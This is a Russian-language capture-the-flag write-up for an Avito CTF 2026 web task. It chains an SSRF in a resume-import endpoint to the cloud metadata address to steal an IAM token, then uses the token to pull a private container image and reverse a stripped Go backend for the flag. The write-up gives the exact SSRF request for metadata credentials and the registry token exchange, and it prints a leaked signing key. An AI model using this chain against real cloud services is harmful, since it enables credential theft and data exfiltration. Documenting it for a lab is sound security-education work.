# МёдХантер — золотая звезда «Рекомендованный» (task19) — write-up

**Avito CTF 2026 · web / reverse (info-disclosure chain)**
**Цель:** понять, какой опыт даёт золотую звезду «Рекомендованный кандидат» (в UI такой настройки нет).
**Сайт:** `https://hrportal-aoa51cvc.avitoctf.ru/`

> Вторая задача цепочки «МёдХантер». Точка входа — **та же SSRF** из task18 (`POST /api/seeker/resume/import`). В task18 она дала нам `.env`; здесь через неё получаем **IAM-токен → приватный registry → образ бэкенда**, который надо отреверсить. То есть task18 = «прочитать метадату», task19 = «через ту же метадату вытащить и разобрать бинарь».

## 1. Краткое условие

По условию (`task.md`) некоторые резюме получают золотую отметку «Рекомендованный кандидат», хотя в интерфейсе такой галочки нет. Нужно понять, **какой именно опыт работы** её включает. Ответ оказался самореферентным: звезду даёт наличие в поле `experience` строки, которая и есть флаг.

## 2. Разведка

- Фронт (тот же `bundle.js`, `bundle.pretty.js`) **даже не рендерит** поле `is_vip` — по клиенту логику звезды не восстановить.
- В списке резюме (`resumes_list.json`, `resume_2.json`) есть сид-запись с `is_vip=true`. **Первая гипотеза** — «скопировать видимый текст VIP-резюме №2». Проверил — не срабатывает: это **приманка**, её видимый текст к присвоению звезды отношения не имеет.
- Вывод: условие **невозможно** угадать из самого приложения. Значит нужно достать и отреверсить **бэкенд**. А путь к бэкенду у нас уже есть — SSRF из task18.

## 3. Уязвимость (root cause)

Здесь «уязвимость» двухслойная:

1. **Info-disclosure через SSRF→IMDSv1→registry.** Та же незакрытая SSRF (нет allow-list, не блокируется `169.254.169.254`) + `yc-imdsv1-bridge`, отдающий AWS-style метадату без заголовка, позволяют вытащить **IAM-токен сервис-аккаунта**. Токена достаточно, чтобы скачать приватный образ — то есть исходный код/бинарь backend утекает наружу.
2. **Скрытая «магическая» бизнес-логика в коде.** Сам триггер звезды — не баг, а недокументированная фича: бэкенд ставит `is_vip=true`, если `experience` **содержит подстроку-флаг**, и при сохранении её же **вырезает** (анти-тампер), поэтому на карточке строку никогда не видно. Именно поэтому её нельзя было вывести из UI — её физически удаляют из хранимого текста.

## 4. Эксплуатация шаг за шагом

### Шаг 1. SSRF → IAM-токен
Google-style IMDS требует заголовок, который SSRF не поставит, но AWS-style мост отдаёт креды **без заголовка**:

```
POST /api/seeker/resume/import   {"url":"http://169.254.169.254/latest/meta-data/iam/security-credentials/default"}
→ отражается Yandex IAM-токен  t1.9euel...   (сохранён в task19/iam_token.txt)
```

### Шаг 2. IAM-токен → bearer приватного registry
Обменял IAM-токен на токен Container Registry (Basic-auth `iam:<token>`):

```
GET https://cr.yandex/v2/token/?scope=repository:<REGISTRY_ID>/hrportal-backend:pull
Authorization: Basic base64("iam:" + <IAM_TOKEN>)
→ registry bearer  (сохранён в task19/reg_bearer.txt)
```

`REGISTRY_ID=crpml40t8ia2kptf4iv7` взят из утёкшего в task18 `.env`.

### Шаг 3. Скачать образ по Registry v2 (без docker-демона)
Registry v2 — это обычный HTTP, docker не нужен, достаточно `curl -L` (blob'ы отдаются через редирект):

```
GET /v2/<REGISTRY_ID>/hrportal-backend/manifests/latest   (Accept: .../manifest.v2+json)
→ manifest.json (4 слоя, см. digests)
GET /v2/<REGISTRY_ID>/hrportal-backend/blobs/sha256:<layer-digest>   (-L для редиректа на storage)
```

`manifest.json` показывает 4 слоя rootfs; распаковал их (`layers/`, `rootfs/`) и нашёл бинарь `/app/hrportal-api`.

### Шаг 4. Реверс Go-бинаря (символы stripped, но `.gopclntab` цел)
Бинарь собран Go со срезанными символами. Спасает таблица `.gopclntab`: по ней Go-рантайм восстанавливает имена и границы функций. Написал маленький распаковщик карты функций на `debug/gosym` (см. **`pcln.go`**):

```go
lt := gosym.NewLineTable(pclnData, textStart)
tab, _ := gosym.NewTable(nil, lt)
for _, fn := range tab.Funcs { /* печатаем fn.Name, fn.Entry, fn.End */ }
```

Так нашёл функцию `hrportal/internal/application.(*SeekerService).SaveResume` и дизассемблировал её в radare2 (**`save_resume.asm`**).

### Шаг 5. Найти условие звезды в дизасме
Ключевые строки из `save_resume.asm`:

- `0x006d7076  mov rcx, [0x010610f0]  ; str.avitogOLd3N_w0rk_eXp3RIEnc3_d37EctED` — константа-флаг в `.rodata`;
- `0x006d70be  mov rdi, [0x010610f8]  ; = 38` — её длина ровно 38 байт (= длина `avito{gOLd3N_w0rk_eXp3RIEnc3_d37EctED}`);
- `0x006d7083  call 0x40cb80` затем `0x006d708b  setge dl` — это `strings.Index(experience, FLAG)`; `setge` даёт `dl=1`, когда индекс `>= 0`, то есть **«experience содержит флаг»**;
- при истинном условии `0x006d70d7  call 0x5057a0` — это `strings.Replace(experience, FLAG, "", -1)`, **вырезающий** подстроку;
- вычисленный bool кладётся в поле структуры резюме (`mov byte [rax + 0x89], cl`), затем идёт `repo.Upsert`.

То есть логика буквально: `is_vip = strings.Contains(experience, "avito{gOLd3N_w0rk_eXp3RIEnc3_d37EctED}")`, а сама строка при этом удаляется из хранимого текста.

### Шаг 6. Подтвердить вживую (PoC)
Создал резюме (авторизованная seeker-кука, `cookies.txt`/`creds.txt`), положив флаг в `experience`:

```
PUT /api/seeker/resume        (seeker-кука)
{"experience":"... avito{gOLd3N_w0rk_eXp3RIEnc3_d37EctED}", ...}
→ ответ: "is_vip": true        (в сохранённом experience токен вырезан)
```

Звезда «Рекомендованный» загорелась. Значит «редкий опыт» = ровно эта строка.

## Бонус-находки в бинаре (мостики к task21)

Пока разбирал образ, рядом с флаг-константой в бинаре нашлись строки, которые сработали позже:
- **`mhq_v1_4f8c2d9a7b6e1c3055aa93df0b8e7241`** — ключ подписи очереди рендера (`RENDER_QUEUE_SIGNING_KEY`). Присутствует прямо в бинаре `hrportal-api`. В task21 именно он даст право **самим ставить задание в очередь рендера**.
- **`incoming/`** — префикс, на который Object Storage триггерит рендер-воркер. Тоже строка из бинаря; в task21 мы кладём задание как `incoming/<uuid>.json`.

(Проверить наличие: `grep -a "mhq_v1_" img/app/hrportal-api` и `grep -a "incoming/" img/app/hrportal-api`.)

Через утёкшие в task18 ключи S3 бакет `medhunter-resumes-6d6c314a` листится и читается напрямую — см. **`s3get.py`** (SigV4-клиент: `list-type=2` + скачивание объектов).

## 5. Флаг

```
avito{gOLd3N_w0rk_eXp3RIEnc3_d37EctED}
```

## 6. Выводы / уроки

- **Когда триггер фичи не выводится из приложения — реверсь бэкенд.** Фронт не рендерил `is_vip`, а сид-VIP-резюме №2 было приманкой. Ответ был только в коде.
- **SSRF → IMDSv1-мост → IAM → приватный registry** — цельная info-disclosure цепочка: одна дыра в «импорте по URL» в итоге отдаёт весь backend-образ.
- **`.gopclntab` спасает даже stripped-Go.** Срезанные символы не мешают: таблица pcln восстанавливает имена/границы функций (`debug/gosym`), дальше — обычный дизасм.
- **Само-референтный триггер + анти-тампер** — красивый трюк автора: строка-триггер вырезается из хранимого текста, поэтому её нельзя подсмотреть на карточке. Урок по защите: не прятать «магические строки» в коде как секрет — реверс их достаёт; не доверять сид-данным как источнику истины.

Артефакты: `pcln.go` (карта функций по `.gopclntab`), `save_resume.asm` (дизасм `SaveResume`), `manifest.json`+`layers/`+`rootfs/` (образ), `iam_token.txt`, `reg_bearer.txt`, `s3get.py`, `cookies.txt`/`creds.txt`.
